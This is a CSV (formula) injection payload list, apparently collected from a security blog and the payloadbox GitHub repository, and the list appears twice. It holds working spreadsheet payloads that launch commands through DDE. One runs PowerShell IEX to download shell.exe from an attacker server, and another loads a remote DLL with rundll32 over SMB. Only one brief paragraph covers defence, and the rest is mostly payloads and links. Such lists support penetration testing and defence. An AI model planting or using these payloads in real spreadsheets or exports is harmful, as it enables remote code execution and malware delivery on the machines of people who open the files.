
CSV Injection Payload List

##
#
https://systemweakness.com/csv-injection-payload-list-e8e1deca6da5
#
https://medium.com/@ghostxploiter/how-a-simple-spreadsheet-can-hack-your-computer-csv-injection-98f4a26c4957
#
https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection
#
##




Screenshot on CSV Injection Attack
CSV injection is a type of cyber attack in which an attacker attempts to inject malicious data into a CSV file. This can happen if the application that processes the CSV file does not properly validate the input, allowing the attacker to insert arbitrary content into the file. The attacker may then be able to manipulate the data in the file, potentially leading to security breaches or other problems. To prevent CSV injection attacks, it is important to always validate user input and ensure that it is free from any malicious content before processing it. This can be done using a variety of techniques, such as input sanitization and filtering.

Payloads :
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
Sources to be read :
https://www.we45.com/blog/2017/02/14/csv-injection-theres-devil-in-the-detail
https://payatu.com/csv-injection-basic-to-exploit
https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection
Examples from the real world :

https://hackerone.com/reports/118582
https://hackerone.com/reports/223344
https://hackerone.com/reports/126109
https://hackerone.com/reports/386116
https://hackerone.com/reports/459532
https://hackerone.com/reports/335447
https://hackerone.com/reports/219323
https://hackerone.com/reports/216243
https://hackerone.com/reports/282628
References :
CSV Injection :

👉 https://owasp.org/www-community/attacks/CSV_Injection
Cloning an Existing Repository ( Clone with HTTPS )

root@ismailtasdelen:~# git clone https://github.com/payloadbox/csv-injection-payloads.git
Cloning an Existing Repository ( Clone with SSH )

root@ismailtasdelen:~# git clone git@github.com:payloadbox/csv-injection-payloads.git
GitHub : https://github.com/payloadbox/csv-injection-payloads



```
CSV Injection Payloads
     

CSV Injection, also known as Formula Injection, occurs when websites embed untrusted input inside CSV files.

Payloads :
=DDE("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
References :
CSV Injection :
👉 https://owasp.org/www-community/attacks/CSV_Injection
Cloning an Existing Repository ( Clone with HTTPS )
root@ismailtasdelen:~# git clone https://github.com/payloadbox/csv-injection-payloads.git
Cloning an Existing Repository ( Clone with SSH )
root@ismailtasdelen:~# git clone git@github.com:payloadbox/csv-injection-payloads.git
Donate!
